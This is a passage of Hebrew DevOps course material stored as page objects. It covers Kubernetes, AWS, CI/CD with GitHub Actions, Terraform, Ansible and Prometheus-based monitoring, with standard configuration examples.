        title: "אובייקטים בסיסיים — Pod, Deployment, Service",
        content: `<div dir="rtl">
<h2>הבניים הבסיסיים של <code>K8s</code></h2>
<p><strong><code>Kubernetes</code></strong> — <code>K8s</code></p>
<p>מנהל <code>containers</code> בקנה מידה.</p>
<p>במקום "הפעל <code>container</code>", אתה מגדיר <strong>מצב רצוי</strong>.</p>
<p><code>K8s</code> דואג שהמצב הזה תמיד יתקיים.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
  <rect x="5" y="5" width="350" height="110" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
  <text x="180" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Kubernetes Cluster</text>
  <rect x="15" y="28" width="150" height="75" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="90" y="42" text-anchor="middle" font-size="9" fill="#7dd3fc">Node 1</text>
  <rect x="22" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="52" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod A</text>
  <rect x="27" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="52" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>
  <rect x="90" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="120" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod B</text>
  <rect x="95" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="120" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>

  <rect x="175" y="28" width="175" height="75" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="262" y="42" text-anchor="middle" font-size="9" fill="#7dd3fc">Node 2</text>
  <rect x="182" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="212" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod C</text>
  <rect x="187" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="212" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>
  <rect x="252" y="28" width="90" height="75" rx="6" fill="#14532d" stroke="#166534" stroke-width="1"/>
  <text x="297" y="48" text-anchor="middle" font-size="8" fill="#86efac">Service</text>
  <text x="297" y="62" text-anchor="middle" font-size="7" fill="#4ade80">LoadBalancer</text>
  <text x="297" y="76" text-anchor="middle" font-size="7" fill="#4ade80">80 → 8080</text>
</svg>
</div>
<table class="content-table">
  <tr><th>אובייקט</th><th>תפקיד</th></tr>
  <tr><td><strong><code>Pod</code></strong></td><td>יחידה הקטנה ביותר — קונטיינר אחד או יותר עם <code>IP</code> משותף</td></tr>
  <tr><td><strong><code>Deployment</code></strong></td><td>מנהל <code>replicas</code> של <code>Pods</code> — מבטיח שתמיד N עותקים רצים</td></tr>
  <tr><td><strong><code>Service</code></strong></td><td>כתובת <code>IP</code> קבועה ו-<code>load balancer</code> פנימי ל-<code>Pods</code></td></tr>
  <tr><td><strong><code>Ingress</code></strong></td><td><code>HTTP routing</code> חיצוני — ניתוב לפי <code>hostname</code> או <code>path</code></td></tr>
  <tr><td><strong><code>ConfigMap</code></strong></td><td>הגדרות לא-סודיות כ-<code>key-value</code></td></tr>
  <tr><td><strong><code>Secret</code></strong></td><td>סיסמאות ו-<code>tokens</code> מוצפנים — <code>base64</code></td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "YAML ו-kubectl — עבודה מעשית",
        content: `<div dir="rtl">
<h2>הגדרת משאבים ב-YAML</h2>
<p><strong>גישה דקלרטיבית</strong></p>
<p>ב-<code>K8s</code> כל דבר מוגדר בקובץ <code>YAML</code>.</p>
<p>אתה מגדיר "מה אתה רוצה" — ו-<code>K8s</code> דואג להגיע לשם.</p>
<div class="code-preview"><pre><code># deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: myapp
        image: myapp:v2.1.0
        ports:
        - containerPort: 8000
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secret
              key: password
---
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: myapp-svc
spec:
  selector:
    app: myapp
  ports:
  - port: 80
    targetPort: 8000
  type: ClusterIP</code></pre></div>
<div class="code-preview"><pre><code># פקודות kubectl חיוניות
kubectl apply -f deployment.yaml      # החל קובץ
kubectl get pods -n production        # רשימת Pods
kubectl describe pod myapp-abc123     # פרטים מלאים
kubectl logs myapp-abc123 -f          # לוגים בזמן אמת
kubectl exec -it myapp-abc123 -- bash # כניסה לקונטיינר
kubectl rollout history deploy/myapp  # היסטוריית deploys</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "HPA — Horizontal Pod Autoscaling",
        content: `<div dir="rtl">
<h2>סקיילינג אוטומטי לפי עומס</h2>
<p><strong><code>HPA</code></strong> — <code>Horizontal Pod Autoscaler</code></p>
<p>מוסיף או מסיר <code>Pods</code> אוטומטית לפי מדדים.</p>
<p>מדדים נתמכים: <code>CPU</code>, <code>Memory</code>, ומדדים מותאמים כמו בקשות לשנייה.</p>
<table class="content-table">
  <tr><th>מדד</th><th>טריגר</th><th>פעולה</th></tr>
  <tr><td>CPU &gt; 70%</td><td><code>scale up</code></td><td>מוסיף <code>Pods</code> עד <code>maxReplicas</code></td></tr>
  <tr><td>CPU &lt; 20%</td><td><code>scale down</code></td><td>מסיר <code>Pods</code> עד <code>minReplicas</code></td></tr>
  <tr><td>Memory</td><td>מותאם</td><td>פחות נפוץ — תלוי <code>workload</code></td></tr>
  <tr><td><code>Custom metric</code></td><td><code>Prometheus</code></td><td>כמות <code>requests/s</code> וכו'</td></tr>
</table>
<div class="code-preview"><pre><code># hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70

# Rolling Update — zero downtime deploy
kubectl set image deployment/myapp myapp=myapp:v2.2.0
kubectl rollout status deployment/myapp

# Rollback אם משהו השתבש
kubectl rollout undo deployment/myapp</code></pre></div>
<p><strong><code>Rolling Update</code></strong></p>
<p><code>K8s</code> מחליף <code>Pods</code> אחד-אחד.</p>
<p>בכל רגע יש גם <code>Pods</code> ישנים וגם חדשים — אין <code>downtime</code>.</p>
<p><strong><code>strategy.maxUnavailable</code></strong></p>
<p>כמה <code>Pods</code> יכולים להיות <code>unavailable</code> בו-זמנית — ברירת מחדל: 25%.</p>
</div>`
      },
      {
        type: "explanation",
        title: "K8s Networking — CNI, DNS, Ingress",
        content: `<div dir="rtl">
<h2>רשתות ב-Kubernetes</h2>
<p><strong>רשת שטוחה</strong></p>
<p><code>K8s</code> יוצר רשת שבה כל <code>Pod</code> מקבל <code>IP</code> ייחודי.</p>
<p>כל <code>Pod</code> יכול לתקשר עם כל <code>Pod</code> אחר — גם על <code>node</code> אחר.</p>
<table class="content-table">
  <tr><th>רכיב</th><th>תפקיד</th></tr>
  <tr><td><strong><code>CNI Plugin</code></strong></td><td>מימוש רשת — <code>Calico</code> / <code>Flannel</code> / <code>Weave</code>. מקצה <code>IPs</code> ל-<code>Pods</code></td></tr>
  <tr><td><strong><code>CoreDNS</code></strong></td><td>DNS פנימי — <code>myapp-svc.production.svc.cluster.local</code></td></tr>
  <tr><td><strong><code>kube-proxy</code></strong></td><td><code>iptables rules</code> לניתוב תעבורה ל-<code>Services</code></td></tr>
  <tr><td><strong><code>Ingress Controller</code></strong></td><td><code>nginx</code> / <code>Traefik</code> — <code>HTTP routing</code> חיצוני</td></tr>
</table>
<div class="code-preview"><pre><code># ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: myapp-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  rules:
  - host: myapp.example.com
    http:
      paths:
      - path: /api
        pathType: Prefix
        backend:
          service:
            name: myapp-svc
            port:
              number: 80
      - path: /
        pathType: Prefix
        backend:
          service:
            name: frontend-svc
            port:
              number: 80
  tls:
  - hosts:
    - myapp.example.com
    secretName: tls-secret</code></pre></div>
<p><strong><code>DNS resolution</code></strong></p>
<p><code>Pod</code> ב-<code>namespace production</code> ניגש לשירות <code>db-svc</code> פשוט בשם <code>db-svc.production</code>.</p>
<p>אין צורך לציין <code>IP</code> מפורש.</p>
</div>`
      }
    ]
  },
  {
    id: 204,
    title: "Cloud — AWS",
    pages: [
      {
        type: "explanation",
        title: "מודלי שירות — IaaS, PaaS, SaaS",
        content: `<div dir="rtl">
<h2>מה הענן בכלל מציע?</h2>
<p><strong>שלוש רמות שירות</strong></p>
<p>ספקי ענן — <code>AWS</code>, <code>Azure</code>, <code>GCP</code> — מציעים 3 רמות שירות.</p>
<p>ככל שעולים ברמות, מקבלים פחות שליטה — אבל גם פחות עבודה.</p>
<table class="content-table">
  <tr><th>מודל</th><th>אתה מנהל</th><th>הספק מנהל</th><th>דוגמה ב-AWS</th></tr>
  <tr><td><strong><code>IaaS</code></strong></td><td><code>OS</code>, <code>Runtime</code>, <code>App</code></td><td>חומרה, וירטואליזציה, רשת</td><td><code>EC2</code>, <code>EBS</code>, <code>VPC</code></td></tr>
  <tr><td><strong><code>PaaS</code></strong></td><td>הקוד שלך בלבד</td><td><code>OS</code>, <code>Runtime</code>, <code>Scaling</code>, <code>DB</code></td><td><code>Elastic Beanstalk</code>, <code>RDS</code></td></tr>
  <tr><td><strong><code>SaaS</code></strong></td><td>הגדרות משתמש</td><td>הכל</td><td><code>Gmail</code>, <code>Salesforce</code></td></tr>
  <tr><td><strong><code>FaaS</code></strong></td><td>פונקציה בודדת</td><td>הכל כולל <code>scaling</code></td><td><code>AWS Lambda</code></td></tr>
</table>
<p><strong>אנלוגיה — פיצה</strong></p>
<ul>
  <li><strong><code>On-Premise</code></strong> — בישול בבית. אתה קונה הכל</li>
  <li><strong><code>IaaS</code></strong> — קיבלת מטבח מצויד. אתה מבשל</li>
  <li><strong><code>PaaS</code></strong> — הזמנת חומרי גלם. המסעדה מבשלת</li>
  <li><strong><code>SaaS</code></strong> — הזמנת פיצה. אתה רק אוכל</li>
</ul>
<p><strong>מדוע ענן?</strong></p>
<p>ארבעה יתרונות מרכזיים:</p>
<ul>
<li><code>Pay-as-you-go</code> — תשלום רק על מה שצורכים</li>
<li><code>Global reach</code> — נוכחות עולמית</li>
<li><code>Elasticity</code> — גדילה וכיווץ אוטומטיים</li>
<li><code>Managed security</code> — אבטחה מנוהלת</li>
</ul>
<p><strong>דוגמה</strong></p>
<p><code>Netflix</code> מפעילה מיליוני שרתים ב-<code>AWS</code> ומשלמת רק על מה שנצרך.</p>
</div>`
      },
      {
        type: "explanation",
        title: "שירותי ליבה — EC2, S3, RDS",
        content: `<div dir="rtl">
<h2>הבלוקים הבסיסיים של AWS</h2>
<p><strong>שירותי ליבה</strong></p>
<table class="content-table">
  <tr><th>שירות</th><th>מה זה</th><th>שימוש נפוץ</th></tr>
  <tr><td><strong><code>EC2</code></strong></td><td>שרתים וירטואליים — <code>Virtual Machines</code></td><td><code>backend</code>, <code>web servers</code></td></tr>
  <tr><td><strong><code>S3</code></strong></td><td>אחסון <code>object</code> — בלתי מוגבל</td><td>תמונות, <code>backups</code>, <code>static site</code></td></tr>
  <tr><td><strong><code>RDS</code></strong></td><td><code>DB</code> מנוהל — <code>Postgres</code> / <code>MySQL</code> / <code>Aurora</code></td><td>מסד נתונים ראשי</td></tr>
  <tr><td><strong><code>VPC</code></strong></td><td>רשת פרטית וירטואלית</td><td>בידוד ואבטחה</td></tr>
  <tr><td><strong><code>Route 53</code></strong></td><td><code>DNS</code> מנוהל + <code>health checks</code></td><td>ניתוב תעבורה עולמית</td></tr>
  <tr><td><strong><code>ALB</code></strong></td><td><code>Application Load Balancer</code></td><td>חלוקת עומסים, <code>SSL termination</code></td></tr>
  <tr><td><strong><code>ECS/EKS</code></strong></td><td>הרצת קונטיינרים / <code>Kubernetes</code></td><td><code>microservices</code></td></tr>
  <tr><td><strong><code>Lambda</code></strong></td><td><code>serverless functions</code></td><td><code>event-driven</code>, <code>batch jobs</code></td></tr>
</table>
<div class="code-preview"><pre><code># AWS CLI — דוגמאות
# הפעל EC2 instance
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --key-name my-keypair \
  --subnet-id subnet-12345678

# העלה קובץ ל-S3
aws s3 cp myfile.zip s3://my-bucket/backups/

# רשימת RDS instances
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceStatus]'</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "VPC — רשת פרטית וירטואלית",
        content: `<div dir="rtl">
<h2>VPC — הרשת שלך בענן</h2>
<p><strong><code>VPC</code></strong> — <code>Virtual Private Cloud</code></p>
<p>הרשת הפרטית שלך ב-<code>AWS</code>.</p>
<p>כל דבר שתקים יהיה בתוכה.</p>
<p><strong>מבנה השכבות</strong></p>
<table class="content-table">
  <tr><th>רכיב VPC</th><th>תפקיד</th><th>CIDR לדוגמה</th></tr>
  <tr><td><strong><code>VPC</code></strong></td><td>הרשת הראשית שלך</td><td>10.0.0.0/16</td></tr>
  <tr><td><strong><code>Public Subnet</code></strong></td><td>גישה לאינטרנט — <code>ALB</code>, <code>NAT GW</code></td><td>10.0.1.0/24</td></tr>
  <tr><td><strong><code>Private Subnet</code></strong></td><td>שרתים פנימיים — <code>EC2</code>, <code>RDS</code></td><td>10.0.2.0/24</td></tr>
  <tr><td><strong><code>Internet Gateway</code></strong></td><td>שער לאינטרנט</td><td>—</td></tr>
  <tr><td><strong><code>NAT Gateway</code></strong></td><td><code>Private Subnet</code> יוצא לאינטרנט</td><td>—</td></tr>
  <tr><td><strong><code>Security Group</code></strong></td><td><code>Firewall</code> ברמת <code>instance</code></td><td>—</td></tr>
  <tr><td><strong><code>NACL</code></strong></td><td><code>Firewall</code> ברמת <code>subnet</code></td><td>—</td></tr>
</table>
<p><strong>כלל אצבע</strong></p>
<ul>
<li><code>Load Balancer</code> ב-<code>Public Subnet</code></li>
<li><code>EC2</code> + <code>RDS</code> ב-<code>Private Subnet</code></li>
</ul>
<p>השרתים הפנימיים יוצאים לאינטרנט דרך <code>NAT Gateway</code>.</p>
<p>אף אחד לא יכול להגיע אליהם ישירות מבחוץ.</p>
<p><strong>אנלוגיה</strong></p>
<p>כמו בית עם שומר בכניסה — <code>ALB</code>.</p>
<p>המבקרים עוברים דרכו, ולא מגיעים ישירות לחדר השינה — <code>DB</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Multi-AZ וסיפור ה-Chaos Monkey של Netflix",
        content: `<div dir="rtl">
<h2>High Availability — Multi-AZ Design</h2>
<p><strong><code>Availability Zones</code></strong> — <code>AZs</code></p>
<p><code>AWS</code> מחלקת כל <code>Region</code> ל-<code>Availability Zones</code>.</p>
<p>אלו מרכזי נתונים פיזיים נפרדים, מחוברים בסיבים מהירים.</p>
<table class="content-table">
  <tr><th>עיצוב</th><th>זמינות</th><th>עלות</th></tr>
  <tr><td><code>Single-AZ</code></td><td>99.9%</td><td>זולה</td></tr>
  <tr><td><code>Multi-AZ</code> (<code>Active-Passive</code>)</td><td>99.99%</td><td>x2</td></tr>
  <tr><td><code>Multi-Region</code></td><td>99.999%</td><td>x4-6</td></tr>
</table>
<p><strong><code>RDS Multi-AZ</code></strong></p>
<p><code>Primary</code> ב-<code>AZ-1</code> + <code>Standby</code> ב-<code>AZ-2</code>.</p>
<p><code>Failover</code> אוטומטי תוך 60-120 שניות אם ה-<code>Primary</code> נפל.</p>
<h3>סיפור — Netflix Chaos Monkey</h3>
<p>ב-2010 <code>Netflix</code> פיתחה כלי שנקרא <strong><code>Chaos Monkey</code></strong>.</p>
<p>תוכנה שמכבה <code>instance</code> אקראי בפרודקשן, כל יום, בשעות העבודה.</p>
<p>הרציונל: "אם נדע שהכל יכול ליפול בכל רגע, נבנה מערכת שמתמודדת עם זה."</p>
<p><code>Chaos Monkey</code> הפכה ל-<strong><code>Simian Army</code></strong> שכוללת:</p>
<ul>
  <li><strong><code>Chaos Gorilla</code></strong> — מוריד <code>AZ</code> שלמה</li>
  <li><strong><code>Latency Monkey</code></strong> — מוסיף <code>latency</code> לתגובות</li>
  <li><strong><code>Conformity Monkey</code></strong> — מוצא <code>instances</code> שלא עומדים בסטנדרטים</li>
</ul>
<p>התוצאה: <code>Netflix</code> מריצה מיליוני <code>streams</code> בו-זמנית עם 99.99%+ <code>uptime</code>.</p>
<p>הסוד: הם <strong>תכננו לכישלון</strong> מראש.</p>
</div>`
      }
    ]
  },
  {
    id: 205,
    title: "CI/CD ו-IaC",
    pages: [
      {
        type: "explanation",
        title: "פילוסופיית DevOps",
        content: `<div dir="rtl">
<h2><code>DevOps</code> — שבירת הקירות</h2>
<p><strong><code>DevOps</code></strong></p>
<p>לפני <code>DevOps</code>, הצוותים <code>Development</code> ו-<code>Operations</code> היו נפרדים לחלוטין.</p>
<p><code>Dev</code> רצה לשלוח קוד מהר.</p>
<p><code>Ops</code> רצה יציבות.</p>
<p>התמריצים היו מנוגדים. התוצאה: <code>deploy</code> פעם בחודש, וכאוס.</p>
<table class="content-table">
  <tr><th>עיקרון</th><th>משמעות</th></tr>
  <tr><td><strong><code>Continuous Integration</code></strong></td><td>כל <code>push</code> → <code>build</code> + <code>tests</code> אוטומטיים</td></tr>
  <tr><td><strong><code>Continuous Delivery</code></strong></td><td>כל <code>commit</code> מוכן לדפלוי בלחיצת כפתור</td></tr>
  <tr><td><strong><code>Continuous Deployment</code></strong></td><td>כל <code>commit</code> עולה לפרודקשן אוטומטית</td></tr>
  <tr><td><strong><code>Infrastructure as Code</code></strong></td><td>תשתית = קוד ב-<code>Git</code>, גרסאות, <code>review</code></td></tr>
  <tr><td><strong><code>Shift Left</code></strong></td><td><code>security</code> ו-<code>testing</code> מוקדם בתהליך</td></tr>
</table>
<p><strong>מדדי <code>DORA</code></strong> — מחקר <code>Google</code> 2019</p>
<ul>
  <li><code>Elite teams</code> מדפלויים 973x יותר תכוף מ-<code>low performers</code></li>
  <li>זמן <code>lead time</code> — שעות לעומת חודשים</li>
  <li><code>MTTR</code> — זמן שיקום — שעה לעומת שבוע</li>
</ul>
<p><code>Amazon</code> מדפלויים לפרודקשן כל <strong>11 שניות</strong>.</p>
<p>זה אפשרי רק עם אוטומציה מלאה מקצה לקצה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "GitHub Actions — CI/CD Pipeline",
        content: `<div dir="rtl">
<h2><code>GitHub Actions</code> — אוטומציה בתוך <code>GitHub</code></h2>
<p><strong><code>GitHub Actions</code></strong></p>
<p>מריצה <code>workflows</code> אוטומטיים על כל <code>push</code>, <code>PR</code>, או לפי לוח זמנים.</p>
<p>אין צורך בשרת <code>CI</code> נפרד.</p>
<div class="code-preview"><pre><code># .github/workflows/deploy.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.12'

    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install pytest

    - name: Run tests
      run: pytest tests/ -v --tb=short

  build-and-push:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Login to DockerHub
      uses: docker/login-action@v3
      with:
        username: \${{ secrets.DOCKER_USERNAME }}
        password: \${{ secrets.DOCKER_TOKEN }}

    - name: Build and push
      uses: docker/build-push-action@v5
      with:
        push: true
        tags: myapp:\${{ github.sha }}

  deploy:
    needs: build-and-push
    runs-on: ubuntu-latest
    steps:
    - name: Deploy to production
      run: |
        kubectl set image deployment/myapp \
          myapp=myapp:\${{ github.sha }}</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform — Infrastructure as Code",
        content: `<div dir="rtl">
<h2>Terraform — תשתית כקוד</h2>
<p><strong><code>Terraform</code></strong> — מבית <code>HashiCorp</code></p>
<p>מאפשר להגדיר תשתית <code>AWS</code> / <code>GCP</code> / <code>Azure</code> בקבצי <code>HCL</code>.</p>
<p>הכל מנוהל ב-<code>Git</code>.</p>
<p>שינויים עוברים <code>review</code> לפני <code>apply</code>, והתוצאה ניתנת לשחזור.</p>
<div class="code-preview"><pre><code># main.tf — VPC + EC2 ב-AWS
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  tags = {
    Name = "production-vpc"
  }
}

resource "aws_subnet" "public" {
  vpc_id     = aws_vpc.main.id
  cidr_block = "10.0.1.0/24"
  availability_zone = "us-east-1a"
}

resource "aws_instance" "web" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t3.micro"
  subnet_id     = aws_subnet.public.id
  tags = {
    Name = "web-server"
  }
}

# Output
output "instance_ip" {
  value = aws_instance.web.public_ip
}</code></pre></div>
<div class="code-preview"><pre><code># מחזור חיים של Terraform
terraform init    # הורדת providers
terraform plan    # תצוגה מקדימה — מה ישתנה?
terraform apply   # ביצוע השינויים
terraform destroy # הריסה מבוקרת</code></pre></div>
<p><strong><code>State file</code></strong></p>
<p><code>Terraform</code> שומר את המצב ב-<code>terraform.tfstate</code>.</p>
<p>בצוות — שומרים את ה-<code>state</code> ב-<code>S3</code> עם <code>DynamoDB locking</code> למניעת כתיבה מקבילה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Ansible — Configuration Management",
        content: `<div dir="rtl">
<h2>Ansible — הגדרת שרתים בקנה מידה</h2>
<p><strong><code>Ansible</code></strong></p>
<p>מגדיר את מצב השרתים — <code>packages</code>, <code>files</code>, <code>services</code> — בצורה דקלרטיבית.</p>
<p><strong><code>Agentless</code></strong></p>
<p>עובד על <code>SSH</code> בלבד, ללא התקנת <code>agent</code> על השרתים.</p>
<table class="content-table">
  <tr><th>כלי</th><th>תפקיד</th><th>שפה</th></tr>
  <tr><td><code>Terraform</code></td><td>יצירת תשתית (<code>provision</code>)</td><td><code>HCL</code></td></tr>
  <tr><td><code>Ansible</code></td><td>הגדרת תוכן שרתים (<code>configure</code>)</td><td><code>YAML</code></td></tr>
  <tr><td><code>GitHub Actions</code></td><td><code>pipeline</code> <code>CI/CD</code></td><td><code>YAML</code></td></tr>
</table>
<div class="code-preview"><pre><code># playbook.yml — התקנת nginx על שרתים
---
- name: Setup web servers
  hosts: webservers
  become: yes  # sudo

  vars:
    app_port: 8000

  tasks:
  - name: Install nginx
    apt:
      name: nginx
      state: present
      update_cache: yes

  - name: Copy nginx config
    template:
      src: nginx.conf.j2
      dest: /etc/nginx/nginx.conf
    notify: restart nginx

  - name: Ensure nginx is running
    service:
      name: nginx
      state: started
      enabled: yes

  handlers:
  - name: restart nginx
    service:
      name: nginx
      state: restarted</code></pre></div>
<div class="code-preview"><pre><code># inventory — רשימת שרתים
[webservers]
web1.example.com
web2.example.com

[databases]
db1.example.com ansible_user=ubuntu

# הרצה
ansible-playbook -i inventory playbook.yml</code></pre></div>
</div>`
      }
    ]
  },
  {
    id: 206,
    title: "Monitoring & SRE",
    pages: [
      {
        type: "explanation",
        title: "3 עמודות האבסרוובביליטי",
        content: `<div dir="rtl">
<h2><code>Observability</code> — לדעת מה קורה</h2>
<p><strong><code>Observability</code></strong></p>
<p>מערכת מודרנית חייבת להיות <strong><code>observable</code></strong>.</p>
<p>לא מספיק שהיא עובדת — היא צריכה לחשוף את מצבה הפנימי.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
  <rect x="10" y="10" width="100" height="95" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="60" y="35" text-anchor="middle" font-size="13" fill="#93c5fd">📊</text>
  <text x="60" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Metrics</text>
  <text x="60" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">מספרים לאורך זמן</text>
  <text x="60" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">CPU, latency, RPS</text>

  <rect x="130" y="10" width="100" height="95" rx="8" fill="#14532d" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="35" text-anchor="middle" font-size="13" fill="#86efac">📋</text>
  <text x="180" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Logs</text>
  <text x="180" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">אירועים בטקסט</text>
  <text x="180" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">errors, debug, audit</text>

  <rect x="250" y="10" width="100" height="95" rx="8" fill="#4c1d95" stroke="#a855f7" stroke-width="1.5"/>
  <text x="300" y="35" text-anchor="middle" font-size="13" fill="#c4b5fd">🔍</text>
  <text x="300" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Traces</text>
  <text x="300" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">מסלול בקשה</text>
  <text x="300" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">microservices flow</text>
</svg>
</div>
<table class="content-table">
  <tr><th>עמוד</th><th>שאלה שעונה עליה</th><th>כלים</th></tr>
  <tr><td><strong><code>Metrics</code></strong></td><td>"האם המערכת בריאה?"</td><td><code>Prometheus</code>, <code>Grafana</code>, <code>CloudWatch</code></td></tr>
  <tr><td><strong><code>Logs</code></strong></td><td>"מה בדיוק קרה?"</td><td><code>ELK Stack</code>, <code>Loki</code>, <code>Splunk</code></td></tr>
  <tr><td><strong><code>Traces</code></strong></td><td>"מה המסלול של הבקשה?"</td><td><code>Jaeger</code>, <code>Zipkin</code>, <code>X-Ray</code></td></tr>
</table>
<p><strong>כלל ה-3 השאלות</strong></p>
<ol>
<li>"יש לי בעיה" — <code>alert</code> מ-<code>Metrics</code></li>
<li>"מה הבעיה?" — חיפוש ב-<code>Logs</code></li>
<li>"איפה בדיוק?" — מעקב עם <code>Traces</code></li>
</ol>
</div>`
      },
      {
        type: "explanation",
        title: "Prometheus + Grafana",
        content: `<div dir="rtl">
<h2>המחסנית הסטנדרטית לניטור</h2>
<p><strong><code>Prometheus</code></strong></p>
<p>אוסף מדדים מהשירותים באמצעות <code>scraping</code>.</p>
<p><strong><code>Grafana</code></strong></p>
<p>מציגה <code>dashboards</code> ויזואליים.</p>
<p><strong><code>AlertManager</code></strong></p>
<p>שולח התראות לפי כללים.</p>
<div class="code-preview"><pre><code># prometheus.yml — הגדרת scraping
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'myapp'
    static_configs:
      - targets: ['myapp:8000']

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

# כלל התראה
groups:
- name: myapp
  rules:
  - alert: HighErrorRate
    expr: |
      rate(http_requests_total{status=~"5.."}[5m])
      / rate(http_requests_total[5m]) > 0.05
    for: 5m
    labels:
      severity: critical
    annotations:
      summary: "שגיאות מעל 5% מהבקשות"</code></pre></div>
<div class="code-preview"><pre><code># Python — חשיפת metrics לPrometheus
from prometheus_client import Counter, Histogram, start_http_server

REQUEST_COUNT = Counter('http_requests_total',
                        'Total requests', ['method', 'status'])
REQUEST_LATENCY = Histogram('http_request_duration_seconds',
                            'Request latency')

@app.middleware("http")
async def metrics_middleware(request, call_next):
    with REQUEST_LATENCY.time():
        response = await call_next(request)
    REQUEST_COUNT.labels(request.method, response.status_code).inc()
    return response</code></pre></div>
<p><strong>PromQL מועיל</strong></p>
<ul>
<li><code>rate(http_requests_total[5m])</code> — בקשות לשנייה</li>
<li><code>histogram_quantile(0.99, ...)</code> — <code>P99 latency</code></li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "SLI, SLO, SLA — ניהול אמינות",
        content: `<div dir="rtl">
<h2>שפת האמינות של Google SRE</h2>
<p><strong><code>SRE</code></strong> — <code>Site Reliability Engineering</code></p>
<p><code>Google</code> המציאה את התחום הזה.</p>
<p>זוהי גישה מהנדסית לניהול שירותים בפרודקשן.</p>
<table class="content-table">
  <tr><th>מושג</th><th>הגדרה</th><th>דוגמה</th></tr>
  <tr><td><strong><code>SLI</code></strong> — <code>Indicator</code></td><td>המדד שמודדים</td><td>% בקשות שהחזירו תגובה תוך 200ms</td></tr>
  <tr><td><strong><code>SLO</code></strong> — <code>Objective</code></td><td>היעד הפנימי</td><td>99.9% הבקשות מגיבות תוך 200ms</td></tr>
  <tr><td><strong><code>SLA</code></strong> — <code>Agreement</code></td><td>הסכם עם לקוחות</td><td>99.5% — אחרת קרדיט כספי</td></tr>
  <tr><td><strong><code>Error Budget</code></strong></td><td>מה מותר להיכשל</td><td>0.1% = 43.8 דקות לחודש <code>downtime</code></td></tr>
</table>
<p><strong><code>Error Budget</code> — הרעיון המפתח</strong></p>
<ul>
<li><code>SLO</code> של 99.9% = 0.1% <code>error budget</code> לחודש</li>
<li>השתמשנו ב-50% מהתקציב? אפשר לדפלוי בזהירות</li>
<li>ניצלנו 100%? אסור לדפלוי עד שמשקמים</li>
</ul>
<p>זה פותר את המתח בין <code>Dev</code> ל-<code>Ops</code>.</p>
<p>שניהם עובדים עם אותו תקציב.</p>
<p><code>Dev</code> רוצה לדפלוי — צריך לשמור <code>error budget</code>.</p>
